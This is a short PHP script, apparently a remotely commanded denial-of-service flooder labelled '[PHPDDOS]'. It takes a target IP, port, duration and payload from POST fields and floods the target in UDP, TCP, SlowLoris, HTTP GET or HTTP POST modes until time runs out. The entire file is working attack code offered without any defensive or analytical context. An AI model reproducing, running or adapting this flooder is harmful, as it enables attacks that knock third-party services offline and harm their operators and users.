set_time_limit(0); 
$packets = 0; 
$ip = $_POST['ip']; 
$port = $_POST['port']; 
$mode = $_POST['mode'];
$exec_time = $_POST['time'];
$timeout = $_POST['timeout'];
$thread = $_POST['thread'];
$size = $_POST['size'];
$spam_str = base64_decode($_POST['spam']);
echo($spam_str);
$time = time();
$max_time = $time+$exec_time; 
echo("[PHPDDOS]");
echo("Flooded: $ip on port $port|");
for($i=0;$i<$size;$i++) { $out .= "X"; }
while(1) { 
	$packets++; 
	if(time()>$max_time) {break;}
	if($mode == "UDP_FLOOD") {
		$fp = fsockopen("udp://$ip", $port, $errno, $errstr, $timeout); 
		if($fp)  { 
			fwrite($fp, $out);
			fclose($fp); 
		} 
	}
	elseif ($mode == "TCP_FLOOD") {
		try {
			$fp = fsockopen("tcp://$ip", $port, $errno, $errstr, $timeout); 
			if($fp) { 
				fwrite($fp, $out);
				fclose($fp);
			} 
		} catch (Exception $e) {
			echo("ERROR://$e");
		}
	}
	elseif ($mode == "SlowLoris") {
		$fp = fsockopen($ip, $port, $errno, $errstr, 140);
		$out = $spam_str;
		fwrite($fp, $out);
	}
	elseif ($mode == "HTTP_GET") {
		$fp = fsockopen($ip, $port, $errno, $errstr, 140);
		$out = $spam_str;
		fwrite($fp, $out);
	}
	elseif ($mode == "HTTP_POST") {
		$fp = fsockopen($ip, $port, $errno, $errstr, 140);
		$out = $spam_str;
		fwrite($fp, $out);
	}
	
} 
echo("Sent : ".$packets);
echo("[PHPDDOS]");